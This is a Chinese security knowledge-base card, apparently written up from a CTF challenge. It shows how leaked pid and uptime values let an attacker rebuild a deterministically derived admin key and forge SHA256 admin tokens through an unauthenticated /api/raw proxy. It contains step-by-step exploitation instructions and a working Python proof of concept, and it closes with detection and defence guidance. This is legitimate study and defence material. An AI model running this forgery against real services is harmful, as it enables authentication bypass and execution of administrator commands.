---
id: crypto-prng-observable-pid-uptime-derived-admin-secret-token-forgery
title: 状态接口泄露 pid/uptime：枚举启动时间复现确定性派生密钥并伪造管理 token
type: scenario
domain: crypto
path: crypto/prng
technique: observable-pid-uptime-deterministic-secret-token-forgery
aliases:
- pid/uptime 密钥派生
- 启动时间枚举
- 自定义 xorshift 密钥派生
- AES S-box 派生密钥
- SHA256 管理 token 伪造
- NeuralChat
tags:
- prng
- predictable-secret
- token-forgery
- sha256
- pid
- uptime
- auth-bypass
- custom-kdf
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V101
  verified_at: '2026-11-05T22:24:37+08:00'
  notes: 已对照原文核对：/api/status泄露pid/uptime、derive_admin_secret的0x045D9F3B/0x119DE1F3+xorshift+AES S-box、SHA256(LE32(ts)||subcmd||body||secret16)、0x01 oracle与±10秒枚举、/api/raw转发均一致；未独立复跑，依赖题目接口字段。卡内exp的seed推进用0x9E3779B9等价于反编译的-1640531527。
---

## 一句话结论

当服务端把内部管理密钥由 `pid` 和进程启动时间经确定性 PRNG + AES S-box 派生，而公开状态接口又返回 `pid` 与 `uptime` 时，攻击者可用 `start_time = now - uptime` 反推启动时间并在秒级窗口内枚举，本地复现同一 16 字节密钥，进而伪造 `SHA256(issued_at || subcommand || body || secret)` 形式的管理 token，通过未鉴权的原始协议代理接口执行管理员命令。

## 原理

- **密钥熵只剩公开值**：`derive_admin_secret(pid, start_time, out)` 的输入只有进程 PID 和启动时间。seed = `0x045D9F3B * pid ^ 0x119DE1F3 * start_time`（32 位截断），之后 16 轮自定义 xorshift 产生 `out[i] = AES_SBOX[xorshift & 0xff]`，每轮再以 `0x9E3779B9 * (i+1) + xorshift` 推进种子。整个过程没有 CSPRNG、没有系统随机源、没有每进程秘密；知道两个输入即可逐字节复现密钥。
- **启动时间可被 uptime 反推**：状态接口返回 `pid` 与 `uptime`（`time(0) - start_time`）。`start_time ≈ now - uptime`，HTTP 往返、秒级取整和响应延迟只会造成数秒误差，枚举 `now - uptime ± 10` 即可覆盖真实值。
- **token 结构可伪造**：校验逻辑为 `|now - issued_at| <= 60` 且 `memcmp(SHA256(LE32(issued_at) || subcommand || body || secret16), auth_tag, 32) == 0`。SHA256 本身没有问题，问题是最后拼接的 `secret16` 可被攻击者复现；时间戳又是攻击者自选且只需落在 ±60 秒内，因此 token 完全可离线生成。
- **攻击入口往往比想象中宽**：本题 Flask 前端的 `/api/raw` 允许调用者提交任意后端命令字节 + payload，前端仅做 base64 解码和转发，没有身份认证；后端 Unix socket 还被 `chmod 777`。即使管理子命令仍需 token，公开原始协议代理已把完整攻击面暴露给任意可达用户。
- **成功判定**：先构造 `subcommand=0x01`（管理员信息，body 为空）的请求。若返回状态字节 0 与 `{"admin":true,...}`，说明该候选 `start_time` 对应的密钥正确；随后可用 `0x05` 等真正有危害的子命令。该 oracle 也会暴露 `start_time`，使后续请求无需再枚举。
- **边界**：若 `pid`/`uptime` 不公开、`start_time` 精度被随机化、密钥改用 CSPRNG 或加入每请求 nonce，则该链断裂；若 token 校验使用 hex 字符串或包含长度前缀，需按实际拼接方式调整；`memcmp` 对 32 字节摘要逐字节比较，理论上存在时序侧信道，但本场景的主问题是密钥可预测，不需要侧信道。

## 触发条件

- 存在公开状态/监控接口，返回进程 `pid` 与 `uptime`（或等价的启动时间信息，如 `/proc/<pid>/stat` 的 starttime、容器创建时间、日志中的启动行）。
- 管理密钥由这些可观测值确定性派生（自定义 PRNG/KDF、时间种子、PID 混合等），而不是启动时生成的随机密钥。
- 管理 token 是无状态摘要（如 `SHA256(ts || subcmd || body || secret)`），没有 nonce、挑战应答或服务端会话绑定。
- 攻击者能访问转发原始命令的接口（`/api/raw`、调试代理、内部 RPC 网关）或直接访问后端 socket。
- token 时间窗口足够宽（如 ±60 秒），允许离线构造与重放。

## 利用步骤

1. 请求状态接口，取 `pid` 与 `uptime`；记录本机当前时间。
2. 计算 `start_time_guess = now - uptime`，在其前后各 10 秒范围内逐个枚举。
3. 对每个候选 `start_time`，按目标算法复现 16 字节 `secret`：`seed = (0x045D9F3B*pid) ^ (0x119DE1F3*start_time)`，16 轮 xorshift + AES S-box 映射。
4. 取当前时间 `issued_at`，构造 `subcommand=0x01`、空 body，计算 `auth_tag = SHA256(pack("<I", issued_at) + bytes([subcmd]) + body + secret)`。
5. 组装管理请求 `issued_at(4) + subcmd(1) + auth_tag(32) + body`，前缀命令字节 `0xFF`，base64 后 POST 到 `/api/raw`。
6. 解析返回帧：首字节为状态码，0 表示成功；从返回 JSON 中确认 `admin:true`，并记录 `start_time`/pid。
7. 用同一密钥构造 `subcommand=0x05` 等有危害的管理命令（本题为 VNM 字节码执行），完成后续利用；若目标提供文件下载接口，可把命令输出写到可下载目录再取回。

## PoC

原文 exp 的密钥派生与 token 伪造核心（未在本机执行；`SBOX` 为标准 AES S-box，此处省略 256 字节表）：

```python
import base64, hashlib, struct, time
import requests

URL = "http://127.0.0.1:5000"
SBOX = [...]  # 标准 AES S-box，按原文完整 256 字节表填入

def get_secret(pid, start_time):
    out = bytearray()
    seed = ((0x045D9F3B * pid) & 0xFFFFFFFF) ^ ((0x119DE1F3 * start_time) & 0xFFFFFFFF)
    for r in range(16):
        seed ^= (seed << 13) & 0xFFFFFFFF
        seed ^= seed >> 7
        seed ^= (seed << 17) & 0xFFFFFFFF
        out.append(SBOX[seed & 0xFF])
        seed = (seed + ((0x9E3779B9 * (r + 1)) & 0xFFFFFFFF)) & 0xFFFFFFFF
    return bytes(out)

def token(subcommand, issued_at, extra, secret):
    msg = struct.pack("<I", issued_at) + bytes([subcommand]) + extra + secret
    return hashlib.sha256(msg).digest()

def build_admin_body(subcommand, issued_at, extra, secret):
    auth_tag = token(subcommand, issued_at, extra, secret)
    return struct.pack("<I", issued_at) + bytes([subcommand]) + auth_tag + extra

# 1) 获取公开的 pid / uptime
data = requests.get(f"{URL}/api/status", timeout=10).json()
pid, uptime = data["pid"], data["uptime"]
base = int(time.time()) - uptime

# 2) 枚举启动时间，用 subcommand=0x01 作为认证 oracle
for i in range(-10, 11):
    start_time = base + i
    secret = get_secret(pid, start_time)
    issued_at = int(time.time())
    body = build_admin_body(0x01, issued_at, b"", secret)
    resp = requests.post(
        f"{URL}/api/raw",
        json={"data": base64.b64encode(b"\xff" + body).decode()},
        timeout=10,
    ).json()
    raw = base64.b64decode(resp["data"])
    if raw[0] == 0:
        print("start_time =", start_time, "secret =", secret.hex())
        break
```

```text
# 后端校验等价伪代码：
# if abs(now - issued_at) > 60: return False
# digest = SHA256(LE32(issued_at) || subcommand || body || g_admin_secret[16])
# return memcmp(digest, auth_tag, 32) == 0
```

## 变体与关联

- **可观测值变体**：`pid + 启动时间`、`时间戳 + 主机名`、`uptime + 版本号`、`/proc/<pid>/stat` 的 starttime、容器启动时间、日志首行时间；核心是“密钥输入可被外部测量”。
- **派生算法变体**：`srand(time)` + `rand()`、MT19937 时间种子、xorshift/LCG、哈希链、AES S-box 查表；只要算法确定且种子可枚举，就能复现。
- **token 变体**：`HMAC(secret, ts || body)`、`SHA256(secret || ts || body)`、带子命令/路径的白名单签名；需要按真实拼接顺序与字节序重放。
- **入口变体**：未鉴权 `/api/raw`、调试代理、GraphQL 内部 mutation、管理端口直接暴露；即使管理接口本身有 token，原始协议桥也绕过了前端权限。
- **关联卡片**：[[crypto-prng-time-seeded-rand-rc4-auth-forge]]（时间种子 + 弱 PRNG 伪造认证报文）、[[crypto-prng-srand-time-seed-2fa-code-prediction]]（时间种子验证码预测）、[[ctf-pwn-bytecode-vm-signed-offset-oob-write-global-command-system]]（本链拿到管理员权限后的 VM 越界写 RCE）。
- **边界**：本题为 CTF 服务，PoC 依赖目标 `/api/status` 字段名与 `/api/raw` 协议；真实目标需按实际接口和派生算法调整。

## 检测与防御

- **密钥生成**：管理密钥必须在进程启动时用 `getrandom`/`/dev/urandom` 等 CSPRNG 生成，绝不能由 pid、时间、主机名等可观测值派生；每个进程/实例独立密钥，定期轮换。
- **接口收敛**：不要公开 `pid`、`uptime`、启动时间等可缩小密钥搜索空间的字段；状态接口做鉴权或只返回聚合指标。
- **协议代理**：删除或严格鉴权 `/api/raw` 这类原始命令转发接口；内部 Unix socket 权限最小化（不要 `chmod 777`），前端进程不应能调用管理员子命令。
- **token 设计**：使用 HMAC/签名并绑定 nonce、请求体哈希、过期时间与调用者身份；使用常量时间比较；限制重放窗口与速率。
- **检测**：监控短时间内在 `/api/raw` 上遍历时间戳/子命令的请求、状态接口高频访问、管理 token 校验失败突增；审计启动日志中密钥派生相关代码。
- **权限隔离**：后端引擎以 root 运行会放大危害；应降权、使用 seccomp/最小能力，并把高危子命令放在独立受控服务中。
